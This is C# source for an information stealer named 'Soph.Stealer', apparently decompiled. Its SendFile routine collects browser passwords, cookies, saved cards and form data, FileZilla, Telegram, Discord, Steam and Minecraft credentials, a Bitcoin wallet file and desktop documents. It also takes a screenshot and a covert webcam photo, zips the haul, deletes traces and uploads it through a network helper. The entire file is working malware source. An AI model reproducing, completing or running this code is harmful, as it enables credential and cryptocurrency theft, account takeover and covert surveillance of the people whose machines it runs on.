

using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;

using System.IO.Compression;
using System.Management;
using System.Text;
using System.Windows.Forms;
using Soph;
using Soph.Autofill;
using Soph.Cards;
using Soph.BTC;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Runtime.CompilerServices;
using System.Net;

namespace Soph.Stealer
{
    internal static class Passwords
    {
        public static void SendFile()
        {

            string randomString = Helper.GetRandomString();
            string str1 = Path.GetTempPath() + randomString;

            Directory.CreateDirectory(str1);
            using (StreamWriter streamWriter = new StreamWriter(str1 + "\\Пароли.log"))
            {
                streamWriter.WriteLine(string.Format("Date: {0}\r\n", (object)DateTime.Now) + string.Format("Windows Username: {0}\r\n", (object)Environment.UserName) + string.Format("HWID: {0}\r\n", (object)RawSettings.HWID) + string.Format("System: {0}\r\n", (object)Passwords.GetWindowsVersion()));
                try
                {
                    foreach (PassData passData in Chromium.Initialise())
                        streamWriter.WriteLine((object)passData);
                }
                catch
                {
                }

            }

            try
            {
                Passwords.DesktopCopy(str1);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }


            try
            {


            }
            catch
            {

            }
            try
            {
                Passwords.get_screenshot(str1 + "\\desktop.jpg");

            }

            catch (Exception ex)

            {
                Console.WriteLine(ex.ToString());
            }
            try
            {
                Passwords.grab_minecraft(str1);
            }
            catch (Exception)
            {
            }
            try
            {
                Passwords.Returgen.get_webcam(str1 + "\\CamPicture.png");
            }
            catch (Exception ex3)
            {
                Console.WriteLine(ex3.ToString());
            }
            try
            {
                Passwords.grab_telegram(str1);
            }
            catch (Exception)
            {
            }
            try
            {
                Passwords.grab_discord(str1);
            }
            catch (Exception)
            {
            }
            try
            {
                Cookies.Chromium.ChromiumInitialise(str1 + "\\");
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
            try
            {
                CC.grab_cards(str1 + "\\");
            }
            catch (Exception ex5)
            {
                Console.WriteLine(ex5.ToString());
            }
            try
            {
                GrabForms.grab_forms(str1 + "\\");
            }
            catch (Exception ex6)
            {
                Console.WriteLine(ex6.ToString());
            }
            try
            {
                FilezillaFTP.FileZilla.Initialise(str1 + "\\");
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
            try
            {
                string bitcoin = Crypto.get_bitcoin();
                if (bitcoin != "" && File.Exists(bitcoin))
                {
                    File.Copy(bitcoin, str1 + "\\wallet.dat");
                }
            }
            catch (Exception ex8)
            {
                Console.WriteLine(ex8.ToString());
            }

            try
            {

                {
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
            try
            {
                Passwords.Zip(str1, Path.GetTempPath() + "\\" + randomString + ".zip");
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
            try
            {
                Passwords.RemoveTempFiles(str1);
            }
            catch (Exception ex)

            {
                Console.WriteLine(ex.ToString());
            }
            try
            {
                Network.UploadFile(Path.GetTempPath() + "\\" + randomString + ".zip");
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }

        private static void Zip(string path, string s)
        {
            ZipFile.CreateFromDirectory(path, s, CompressionLevel.Fastest, false, Encoding.UTF8);
        }

        private static void grab_telegram(string string_0)
        {

            string environmentVariable = Environment.GetEnvironmentVariable("AppData");
            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\Telegram.exe"))
            {
                Directory.CreateDirectory(string_0 + "\\Telegram");
                try
                {
                    File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Roaming\\Telegram Desktop\\tdata\\D877F783D5D3EF8C1", string_0 + "\\Telegram\\BA06DDED727EF6FD1", true);
                    File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Roaming\\Telegram Desktop\\tdata\\D877F783D5D3EF8C0", string_0 + "\\Telegram\\D80AAA9EA28983B50", true);
                }
                catch
                {
                }
                try
                {
                    File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\tdata\\D877F783D5D3EF8C\\map1", string_0 + "\\Telegram\\map1", true);
                    File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\tdata\\D877F783D5D3EF8C\\map0", string_0 + "\\Telegram\\map0", true);
                }
                catch
                {
                }
            }
        }

        private static void grab_discord(string string_0)
        {
            Directory.CreateDirectory(string_0 + "\\Discord");
            try
            {
                if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\\\discord\\Local Storage\\https_discordapp.com_0.localstorage"))
                {
                    Directory.CreateDirectory(string_0 + "\\Discord");
                    File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\https_discordapp.com_0.localstorage", string_0 + "\\Discord\\https_discordapp.com_0.localstorage", true);
                }
            }
            catch
            {
            }
        }
        private static void grab_minecraft(string string_0)
        {
            string environmentVariable = Environment.GetEnvironmentVariable("AppData");
            Environment.GetEnvironmentVariable("LocalAppData");
            string environmentVariable2 = Environment.GetEnvironmentVariable("userprofile");
            Environment.GetEnvironmentVariable("username");
            try
            {
                if (File.Exists(environmentVariable + "\\.minecraftonly\\userdata"))
                {
                    Directory.CreateDirectory(string_0 + "\\Applications\\MinecraftOnly\\");
                    File.Copy(environmentVariable + "\\.minecraftonly\\userdata", string_0 + "\\Applications\\MinecraftOnly\\userdata", true);
                }
            }
            catch (Exception)
            {
            }
            try
            {
                if (File.Exists(environmentVariable + "\\.vimeworld\\config"))
                {
                    Directory.CreateDirectory(string_0 + "\\Applications\\VimeWorld\\");
                    File.Copy(environmentVariable + "\\.vimeworld\\config", string_0 + "\\Applications\\VimeWorld\\config", true);
                }
            }
            catch (Exception)
            {
            }
            try
            {
                if (File.Exists(environmentVariable2 + "\\McSkill\\settings.bin"))
                {
                    Directory.CreateDirectory(string_0 + "\\Applications\\McSkill\\");
                    File.Copy(environmentVariable2 + "\\McSkill\\settings.bin", string_0 + "\\Applications\\McSkill\\settings.bin", true);
                }
            }
            catch (Exception)
            {
            }
            try
            {
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Valve").OpenSubKey("Steam");
                string text = (string)registryKey.GetValue("SteamPath");
                if (File.Exists(text + "\\Steam.exe"))
                {
                    Directory.CreateDirectory(string_0 + "\\Applications\\Steam\\");
                    FileInfo[] files = new DirectoryInfo(text).GetFiles();
                    for (int i = 0; i < files.Length; i++)
                    {
                        Directory.CreateDirectory(string_0 + "\\Applications\\Steam\\config");
                    }
                    foreach (FileInfo fileInfo in new DirectoryInfo(text).GetFiles())
                    {
                        if (fileInfo.Name.Contains("ssfn"))
                        {
                            fileInfo.CopyTo(string_0 + "\\Applications\\Steam\\" + fileInfo.Name);
                        }
                    }
                    File.Copy(text + "\\config\\config.vdf", string_0 + "\\Applications\\Steam\\config\\config.vdf", true);
                    File.Copy(text + "\\config\\loginusers.vdf", string_0 + "\\Applications\\Steam\\config\\loginusers.vdf", true);
                }
            }
            catch (Exception)
            {
            }
            try
            {
                if (File.Exists(environmentVariable + "\\.LavaServer\\Settings.reg"))
                {
                    Directory.CreateDirectory(string_0 + "\\Applications\\LavaCraft\\");
                    File.Copy(environmentVariable + "\\.LavaServer\\Settings.reg", string_0 + "\\Applications\\LavaCraft\\Settings.reg", true);
                }
            }
            catch (Exception)
            {
            }
            try
            {
                if (File.Exists(environmentVariable + "\\.minecraft\\launcher_profiles.json"))
                {
                    Directory.CreateDirectory(string_0 + "\\Applications\\MinecraftLauncher\\");
                    File.Copy(environmentVariable + "\\.minecraft\\launcher_profiles.json", string_0 + "\\Applications\\MinecraftLauncher\\launcher_profiles.json", true);
                }
            }
            catch (Exception)
            {
            }
            try
            {
                if (File.Exists(environmentVariable + "\\.redserver\\authdata"))
                {
                    Directory.CreateDirectory(string_0 + "\\Applications\\RedServer\\");
                    File.Copy(environmentVariable + "\\.redserver\\authdata", string_0 + "\\Applications\\RedServer\\authdata", true);
                }
            }
            catch (Exception)
            {
            }
        }

        public static string GetWindowsVersion()
        {
            try
            {
                ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM CIM_OperatingSystem");
                string empty = string.Empty;
                foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
                    empty = managementBaseObject["Caption"].ToString();
                if (empty.Contains("8"))
                    return "Windows 8";
                if (empty.Contains("8.1"))
                    return "Windows 8.1";
                if (empty.Contains("10"))
                    return "Windows 10";
                if (empty.Contains("XP"))
                    return "Windows XP";
                if (empty.Contains("7"))
                    return "Windows 7";
                return empty.Contains("Server") ? "Windows Server" : "Unknown";
            }
            catch
            {
                return "Unknown";
            }
        }

        private static void DesktopCopy(string directorypath)
        {
            try
            {
                foreach (FileInfo file in new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)).GetFiles())
                {
                    if (!(file.Extension != ".txt") || !(file.Extension != ".doc") || (!(file.Extension != ".docx") || !(file.Extension != ".log")))
                    {
                        Directory.CreateDirectory(directorypath + "\\Files\\");
                        file.CopyTo(directorypath + "\\Files\\" + file.Name);
                    }

                }

            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }
        private static void RemoveTempFiles(string directorypath)
        {
            try
            {
                foreach (DirectoryInfo directory in new DirectoryInfo(directorypath).GetDirectories())
                {
                    foreach (FileSystemInfo file in directory.GetFiles())
                        file.Delete();
                    directory.Delete();
                }
                foreach (FileSystemInfo file in new DirectoryInfo(directorypath).GetFiles())
                    file.Delete();
                Directory.Delete(directorypath);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }


        private static void get_screenshot(string string_0)
        {
            try
            {
                int width = Screen.PrimaryScreen.Bounds.Width;
                int height = Screen.PrimaryScreen.Bounds.Height;
                Bitmap bitmap = new Bitmap(width, height);
                Graphics.FromImage(bitmap).CopyFromScreen(0, 0, 0, 0, bitmap.Size);
                bitmap.Save(string_0, ImageFormat.Jpeg);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }
        internal class Returgen
        {
            // Token: 0x06000032 RID: 50 RVA: 0x000023E6 File Offset: 0x000005E6
            [CompilerGenerated]

            internal static void get_webcam(string string_0)
            {

                IntPtr intPtr = Marshal.StringToHGlobalAnsi(string_0);
                IntPtr intptr_ = Passwords.Returgen.capCreateCaptureWindowA("VFW Capture", -1073741824, 0, 0, 640, 480, 0, 0);

                Passwords.Returgen.SendMessage(intptr_, 1034u, 0, 0);
                Passwords.Returgen.SendMessage(intptr_, 1049u, 0, intPtr.ToInt32());
                Passwords.Returgen.SendMessage(intptr_, 1035u, 0, 0);
                Passwords.Returgen.SendMessage(intptr_, 16u, 0, 0);
            }


            [DllImport("avicap32.dll")]
            public static extern IntPtr capCreateCaptureWindowA(string string_0, int int_0, int int_1, int int_2, int int_3, int int_4, int int_5, int int_6);
            [DllImport("user32")]
            public static extern int SendMessage(IntPtr intptr_0, uint uint_0, int int_0, int int_1);


        }
    }

        }

    
    

